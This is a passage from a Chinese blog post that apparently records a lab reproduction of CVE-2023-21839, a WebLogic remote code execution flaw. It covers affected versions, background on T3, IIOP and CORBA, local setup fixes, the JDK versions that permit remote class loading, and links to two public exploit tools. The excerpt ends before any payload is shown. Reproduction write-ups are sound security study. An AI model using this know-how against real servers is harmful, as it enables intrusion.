id=\"CVE-2023-21839-Weblogic远程代码执行漏洞\"><a href=\"#CVE-2023-21839-Weblogic远程代码执行漏洞\" class=\"headerlink\" title=\"CVE-2023-21839 Weblogic远程代码执行漏洞\"></a>CVE-2023-21839 Weblogic远程代码执行漏洞</h1><p>该漏洞的影响范围为<code>Weblogic 12.2.1.3.0, 12.2.1.4.0, 14.1.1.0.0</code></p>\n<p>先在官方的进行修复更新文档中进行查看</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p><a href=\"https://www.oracle.com/security-alerts/cpujan2023.html\">Oracle Critical Patch Update Advisory - January 2023</a></p></blockquote>\n<p><img src=\"/post/CVE-Tes/image-20230226154457424.png\" alt=\"image-20230226154457424\"></p>\n<table>\n<thead>\n<tr>\n<th align=\"left\">CVE-2023-21839</th>\n<th>Oracle WebLogic Server</th>\n<th>核心</th>\n<th>T3， IIOP</th>\n<th>是的</th>\n<th>7.5</th>\n<th>网络</th>\n<th>低</th>\n<th>没有</th>\n<th>没有</th>\n<th>未 更改</th>\n<th>高</th>\n<th>没有</th>\n<th>没有</th>\n<th>12.2.1.3.0 12.2.1.4.0 14.1.1.0.0</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"left\">CVE-id</td>\n<td>产品</td>\n<td>元件</td>\n<td>协议</td>\n<td>无需身份验证即可远程利用。</td>\n<td>评分</td>\n<td>攻击向量</td>\n<td>攻复合体</td>\n<td>Privs’Req[权限提提升]</td>\n<td>用户交互</td>\n<td>范围</td>\n<td>倾诉</td>\n<td>内涵</td>\n<td>可用性</td>\n<td>版本</td>\n</tr>\n</tbody></table>\n<h2 id=\"概念\"><a href=\"#概念\" class=\"headerlink\" title=\"概念\"></a>概念</h2><h3 id=\"weblogic是什么？\"><a href=\"#weblogic是什么？\" class=\"headerlink\" title=\"weblogic是什么？\"></a>weblogic是什么？</h3><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>WebLogic是<a href=\"https://baike.baidu.com/item/%E7%BE%8E%E5%9B%BDOracle%E5%85%AC%E5%8F%B8/9952086?fromModule=lemma_inlink\">美国Oracle公司</a>出品的一个application server，确切的说是一个基于<a href=\"https://baike.baidu.com/item/JAVAEE/3066623?fromModule=lemma_inlink\">JAVAEE</a>架构的<a href=\"https://baike.baidu.com/item/%E4%B8%AD%E9%97%B4%E4%BB%B6/452240?fromModule=lemma_inlink\">中间件</a>，WebLogic是用于开发、集成、部署和管理大型分布式Web应用、<a href=\"https://baike.baidu.com/item/%E7%BD%91%E7%BB%9C%E5%BA%94%E7%94%A8/2196523?fromModule=lemma_inlink\">网络应用</a>和<a href=\"https://baike.baidu.com/item/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%BA%94%E7%94%A8/10563731?fromModule=lemma_inlink\">数据库应用</a>的<a href=\"https://baike.baidu.com/item/Java/85979?fromModule=lemma_inlink\">Java</a>应用服务器。将Java的动态功能和Java Enterprise标准的安全性引入大型网络应用的开发、集成、部署和管理之中。</p></blockquote>\n<h4 id=\"T3的概念和交互过程\"><a href=\"#T3的概念和交互过程\" class=\"headerlink\" title=\"T3的概念和交互过程\"></a>T3的概念和交互过程</h4><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>T3也称为丰富套接字，是BEA内部协议，功能丰富，可扩展性好。T3是多工双向和异步协议，经过高度优化，只使用一个套接字和一条线程。借助这种方法，基于Java的客户端可以根据服务器方需求使用多种<code>RMI</code>对象，但仍使用一个套接字和一条线程。这也为我们静态分析t3协议带来了很多麻烦</p>\n<p>RMI在log4j中提到，它是一个调用远程类的一个Java的方法</p></blockquote>\n<p><strong>交互方式</strong></p>\n<p><img src=\"/post/CVE-Tes/image-20230226152124965.png\" alt=\"image-20230226152124965\"></p>\n<h4 id=\"iiop概念\"><a href=\"#iiop概念\" class=\"headerlink\" title=\"iiop概念\"></a>iiop概念</h4><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>用来在CORBA<a href=\"https://baike.baidu.com/item/%E5%AF%B9%E8%B1%A1%E8%AF%B7%E6%B1%82%E4%BB%A3%E7%90%86?fromModule=lemma_inlink\">对象请求代理</a>之间交流的协议。Java中使得程序可以和其他语言的CORBA实现<a href=\"https://baike.baidu.com/item/%E4%BA%92%E6%93%8D%E4%BD%9C%E6%80%A7?fromModule=lemma_inlink\">互操作性</a>的协议。</p>\n<p>这个协议的最初阶段是要建立以下几个组件部分：一个IIOP到HTTP的<a href=\"https://baike.baidu.com/item/%E7%BD%91%E5%85%B3?fromModule=lemma_inlink\">网关</a>，使用这个网关可以让CORBA客户访问WWW资源；一个HTTP到IIOP的网关，通过这个网关可以访问CORBA资源；一个为IIOP和HTTP提供资源的服务器，一个能够将IIOP作为可识别协议的浏览器。</p></blockquote>\n<h4 id=\"什么是CORBA\"><a href=\"#什么是CORBA\" class=\"headerlink\" title=\"什么是CORBA\"></a>什么是CORBA</h4><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>CORBA（Common ObjectRequest Broker Architecture公共对象请求代理体系结构）是由<a href=\"https://baike.baidu.com/item/OMG/3041465?fromModule=lemma_inlink\">OMG</a>组织制订的一种标准的<a href=\"https://baike.baidu.com/item/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/2262089?fromModule=lemma_inlink\">面向对象</a>应用程序体系规范。或者说CORBA体系结构是对象管理组织（OMG）为解决<a href=\"https://baike.baidu.com/item/%E5%88%86%E5%B8%83%E5%BC%8F%E5%A4%84%E7%90%86/3352171?fromModule=lemma_inlink\">分布式处理</a>环境(DCE)中，硬件和软件系统的互连而提出的一种解决方案；OMG组织是一个国际性的<a href=\"https://baike.baidu.com/item/%E9%9D%9E%E7%9B%88%E5%88%A9%E7%BB%84%E7%BB%87/5622954?fromModule=lemma_inlink\">非盈利组织</a>，其职责是为<a href=\"https://baike.baidu.com/item/%E5%BA%94%E7%94%A8/3994271?fromModule=lemma_inlink\">应用</a>开发提供一个公共框架，制订工业指南和对象管理规范，加快对象技术的发展。</p></blockquote>\n<h2 id=\"环境搭建-2\"><a href=\"#环境搭建-2\" class=\"headerlink\" title=\"环境搭建\"></a>环境搭建</h2><p>从官网下载<code>Weblogic 12.2.1.3.0</code></p>\n<p><img src=\"/post/CVE-Tes/image-20230226141556869.png\" alt=\"image-20230226141556869\"></p>\n<p>然后解压其中的jar包，然后到<code>/disk1/install</code>下执行cmd脚本就行</p>\n<p>但是需要注意，由于<code>Weblogic</code>中的<code>maven</code>的存在，其识别<code>jdk</code>时，只针对环境变量名<code>JAVA_HOME</code>的路径进行识别，而如果是在PATH中配置的，会报错找不到<code>java</code>环境的位置</p>\n<figure class=\"highlight subunit\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">ERROR: </span>Cannot determine the Java Home ERROR: Specify the -jreLoc option</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/post/CVE-Tes/image-20230226142921961.png\" alt=\"image-20230226142921961\"></p>\n<p>然后再次管理员执行时发现失败，查看报错日志</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>java.lang.NullPointerException: Cannot invoke “java.lang.<strong><code>reflect.Method</code></strong>.invoke(Object, Object[])” because “com.sun.<code>xml.bind</code>.v2.runtime.reflect.opt.Injector.defineClass” <strong><code>is null</code></strong>[[</p></blockquote>\n<p>猜测应该是我的<code>java</code>自身的问题</p>\n<p>从<code>stack</code>中了解到了，在<code>java9</code>的时候，<code>JAXB</code>（Java Architecture for XML Binding）<code>[java映射为xml的表示方式]</code> </p>\n<p>在<code>java9</code>已经被标记为弃用，在<code>java11</code>的时候已经被删除，所以需要换到低版本的<code>java</code>或者在依赖项添加<code>xml</code>库，让其重新映射</p>\n<p><a href=\"https://javaalmanac.io/jdk/11/apidiff/9/\">New APIs in Java 11 - javaalmanac.io</a></p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>com.sun.xml.bind<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>jaxb-impl<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>2.3.1<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>com.sun.xml.messaging.saaj<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>saaj-impl<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>1.5.1<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>【建议下载jdk8低版本最方便，记得再次修改JAVA_HOME环境变量】</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>注意，这个和log4j的原因一样，是加载远程恶意类导致远程命令的执行，所以对java是否开启加载远程类，也就是要注意对应的版本</p>\n<p>版本≤ <code>JDK 6u211、7u201、 8u191、11.0.1</code></p>\n<p>所以我这里复现的环境和apache的log4j2一样，是<code>JDK-8u171</code></p></blockquote>\n<p>安装搭建按流程按引导</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://localhost:7001/console</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/post/CVE-Tes/image-20230226165115723.png\" alt=\"image-20230226165115723\"></p>\n<h2 id=\"渗透流程\"><a href=\"#渗透流程\" class=\"headerlink\" title=\"渗透流程\"></a>渗透流程</h2><p>这是2023年一月的洞，我是二月复现的，目前大致就两种payload工具，一个<code>java</code>的，一个<code>go</code></p>\n<p>仔细分析一下漏洞的利用条件和形成原因，以及两个工具的脚本的原理</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>go的<a href=\"https://github.com/4ra1n/CVE-2023-21839\">4ra1n&#x2F;CVE-2023-21839: Weblogic CVE-2023-21839 RCE (无需Java依赖一键RCE) (github.com)</a></p>\n<p>java的<a href=\"https://github.com/DXask88MA/Weblogic-CVE-2023-21839\">DXask88MA&#x2F;Weblogic-CVE-2023-21839 (github.com)</a></p></blockquote>\n<p>两者大差不差，但是个人感觉go更舒服一些</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 